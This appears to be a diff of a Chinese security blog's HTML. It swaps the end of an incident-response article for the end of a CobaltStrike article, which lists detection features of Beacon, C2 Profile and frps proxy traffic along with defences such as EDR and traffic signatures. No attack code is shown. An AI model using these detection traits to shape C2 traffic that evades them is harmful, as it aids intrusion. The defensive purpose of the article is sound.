-</span></span></code></pre></td></tr></table></div></div><h2 id=五小结>五、小结</h2><p>应急响应的核心不是“会几条命令”，而是<strong>按事件类型选对处置路径 + 按方法论做溯源</strong>。勒索先隔离、Webshell 先查入口、爆破先锁账号、横向先分段。把“定起点 → 串时间线 → 找证据 → 定影响面”这套溯源流程练熟，才能把事件讲清楚、处置干净。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/>应急响应</a>
-<a href=/tags/%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90/>事件溯源</a>
-<a href=/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/>安全运维</a>
-<a href=/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/>日志分析</a>
-<a href=/tags/%E5%8B%92%E7%B4%A2/>勒索</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088082/><div class=article-details><h2 class=article-title>Linux 应急响应实战（处置全流程）</h2></div></a></article><article><a href=/p/751088112/><div class=article-details><h2 class=article-title>护网 / 重保经验总结</h2></div></a></article><article><a href=/p/751088017/><div class=article-details><h2 class=article-title>日志分析入门：access.log 找攻击痕迹</h2></div></a></article><article><a href=/p/758853848/><div class=article-details><h2 class=article-title>Linux/Windows 入侵排查指南</h2></div></a></article><article><a href=/p/751088103/><div class=article-details><h2 class=article-title>Docker 与 Kubernetes 云安全实战</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• Beacon 通信特征：固定间隔心跳 + 特定 Header
+</span></span><span class=line><span class=cl>• C2 Profile 特征：特定 URI/Header 模式
+</span></span><span class=line><span class=cl>• Socks 代理：frps 端口通信
+</span></span><span class=line><span class=cl>• 异常进程：CS 生成的一进程多 shellcode 注入
+</span></span></code></pre></td></tr></table></div></div><h2 id=十防御>十、防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. EDR：检测 Beacon 进程注入行为
+</span></span><span class=line><span class=cl>2. 网络：C2 Profile 流量特征库匹配
+</span></span><span class=line><span class=cl>3. DNS：拦截异常 DNS 解析
+</span></span><span class=line><span class=cl>4. ASR：限制进程创建
+</span></span></code></pre></td></tr></table></div></div><h2 id=十一小结>十一、小结</h2><p>CobaltStrike 是 C2 标杆工具。核心能力是"Beacon 通信 + 横向 + Socks 代理"。防守核心是 EDR 行为检测 + C2 Profile 流量特征库。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/cobaltstrike/>CobaltStrike</a>
+<a href=/tags/beacon/>Beacon</a>
+<a href=/tags/c2/>C2</a>
+<a href=/tags/teamserver/>Teamserver</a>
+<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>最后更新于 Aug 30, 2026 10:00 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088097/><div class=article-details><h2 class=article-title>Vshell 深度实战：功能模块与免杀</h2></div></a></article><article><a href=/p/751088109/><div class=article-details><h2 class=article-title>免杀实战深化：加载器、分离与 EDR 对抗</h2></div></a></article><article><a href=/p/751088093/><div class=article-details><h2 class=article-title>Cobalt Strike 深度实战：木马生成、正反向与插件</h2></div></a></article><article><a href=/p/751088091/><div class=article-details><h2 class=article-title>免杀基础与对抗（shellcode 混淆/进程注入/AMSI 绕过）</h2></div></a></article><article><a href=/p/751088090/><div class=article-details><h2 class=article-title>冰蝎与哥斯拉：WebShell 管理实战（加密流量与 WAF 绕过）</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
